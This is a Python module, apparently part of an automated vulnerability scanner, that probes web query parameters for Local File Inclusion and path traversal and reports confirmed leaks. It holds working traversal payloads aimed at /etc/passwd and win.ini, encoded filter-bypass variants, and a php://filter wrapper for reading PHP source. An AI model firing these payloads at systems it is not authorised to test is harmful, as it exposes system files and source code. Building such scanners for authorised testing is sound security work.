"""Local File Inclusion / Path Traversal probe (vuln phase, non-destructive).

For file-ish query parameters (`file`, `path`, `page`, `template`, `doc`,
`document`, `include`, `view`, `name`, `lang`, `download`, `filename`, `dir`,
`folder`, `load`) this worker injects classic read-only traversal payloads for
both *nix and Windows targets, plus a PHP base64 wrapper, and confirms a hit
only when the response body leaks a recognizable system-file signature:

  * ``/etc/passwd``        — line shaped like ``root:x:0:0:`` / ``root:...:0:0:``
  * ``C:\\windows\\win.ini`` — section headers ``[fonts]`` / ``[extensions]``
  * ``php://filter`` wrapper — a base64 blob that decodes to PHP source

A benign control value (a normal-looking filename) is fetched first; if the
control response already contains the signature it is treated as a baseline
artifact and that parameter is skipped — keeps the false-positive rate low on
pages that legitimately echo such strings.

READ-ONLY: every payload only *reads* (or attempts to read) a file. Nothing is
written, deleted, or otherwise mutated.
"""

from __future__ import annotations

import base64
import binascii
import logging
import re
from typing import List, Optional
from urllib.parse import parse_qsl, urlsplit

from core.swarm_engine import SwarmAgent
from core.swarm_workers import register_worker

from ._http import HttpResp, add_query, fetch, normalize_target_url

logger = logging.getLogger("viper.swarm_workers.vuln.lfi")

TECHNIQUE = "lfi"

# Parameters that commonly take a filename/path and are LFI-prone.
_FILE_PARAMS = [
    "file", "path", "page", "template", "doc", "document", "include",
    "view", "name", "lang", "download", "filename", "dir", "folder", "load",
]

# Read-only traversal payloads (nix + Windows) plus a PHP wrapper. Use a DEEP
# traversal (8x ../): extra ../ at filesystem root are no-ops, so one deep
# payload reaches /etc/passwd from both shallow and deep docroots (DVWA's
# /var/www/html/vulnerabilities/fi/ needs 5+, a shallow app needs 1-2).
_TRAV = "../" * 8
_PAYLOADS = [
    _TRAV + "etc/passwd",
    ("..%2f" * 8) + "etc%2fpasswd",
    ("....//" * 8) + "etc/passwd",
    _TRAV + "windows/win.ini",
    "php://filter/convert.base64-encode/resource=index",
]

# Extend with the curated payload library (knowledge/payloads.json) — adds
# /proc/self/environ, extra wrappers and encodings learned from real reports.
# Our deep-traversal defaults stay first; library payloads are appended deduped.
try:
    from core.payload_library import merge_payloads
    _PAYLOADS = merge_payloads(_PAYLOADS, "lfi")
except Exception:  # noqa: BLE001 — library is optional; never break the worker
    pass

# A harmless, normal-looking control value used for the baseline request.
_CONTROL = "index"

# /etc/passwd root line: root:x:0:0:... or root:<anything>:0:0:...
_PASSWD_RE = re.compile(r"root:.*?:0:0:")
# win.ini canonical section headers.
_WININI_RE = re.compile(r"\[(?:fonts|extensions)\]", re.I)
# base64 blob candidates (long, base64 alphabet) to test for decoded PHP.
_B64_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
# Markers that decoded bytes are PHP source.
_PHP_MARKERS = (b"<?php", b"<?=")


def _decodes_to_php(body: str) -> Optional[str]:
    """Return a snippet if any base64 blob in `body` decodes to PHP source."""
    for m in _B64_RE.finditer(body):
        blob = m.group(0)
        # base64 length must be a multiple of 4 to decode cleanly.
        trimmed = blob[: len(blob) - (len(blob) % 4)]
        if len(trimmed) < 40:
            continue
        try:
            decoded = base64.b64decode(trimmed, validate=True)
        except (binascii.Error, ValueError):
            continue
        low = decoded.lstrip()[:64].lower()
        if any(low.startswith(mk) or mk in decoded[:64].lower() for mk in _PHP_MARKERS):
            return blob[:48]
    return None


def _match_signature(body: str) -> Optional[tuple[str, str]]:
    """Return (kind, evidence) if `body` leaks a known system-file signature."""
    if not body:
        return None
    m = _PASSWD_RE.search(body)
    if m:
        return ("passwd", m.group(0))
    m = _WININI_RE.search(body)
    if m:
        return ("win.ini", m.group(0))
    php = _decodes_to_php(body)
    if php:
        return ("php-wrapper", f"base64→PHP: {php}…")
    return None


def _candidate_params(url: str) -> List[str]:
    """File-ish params already present on the URL, else the full default set."""
    existing = {k.lower() for k, _ in parse_qsl(urlsplit(url).query)}
    present = [p for p in _FILE_PARAMS if p in existing]
    return present or list(_FILE_PARAMS)


async def run(agent: SwarmAgent) -> List[dict]:
    url = normalize_target_url(agent.target)
    if not url:
        return []
    timeout = min(agent.timeout_s, 10.0)
    findings: list[dict] = []

    for param in _candidate_params(url):
        # Baseline with a benign control value: if the signature already shows
        # up here, the page echoes it normally — skip to avoid a false positive.
        control_url = add_query(url, param, _CONTROL)
        baseline = await fetch("GET", control_url, timeout=timeout)
        if baseline is not None and _match_signature(baseline.body):
            continue

        for payload in _PAYLOADS:
            test_url = add_query(url, param, payload)
            resp = await fetch("GET", test_url, timeout=timeout)
            if resp is None or not resp.body:
                continue
            hit = _match_signature(resp.body)
            if not hit:
                continue
            kind, evidence = hit
            findings.append({
                "type": "lfi",
                "vuln_type": f"lfi:{param}",
                "title": f"Local File Inclusion / Path Traversal via '{param}'",
                "severity": "high",
                "url": test_url,
                "parameter": param,
                "payload": payload,
                "cwe": "CWE-22",
                "confidence": 0.9,
                "evidence": (
                    f"{kind} signature leaked in response: {evidence!r} "
                    f"(absent in control={_CONTROL!r})"
                ),
            })
            # One confirmed leak per parameter is enough.
            break

    return findings


register_worker("vuln", TECHNIQUE, run)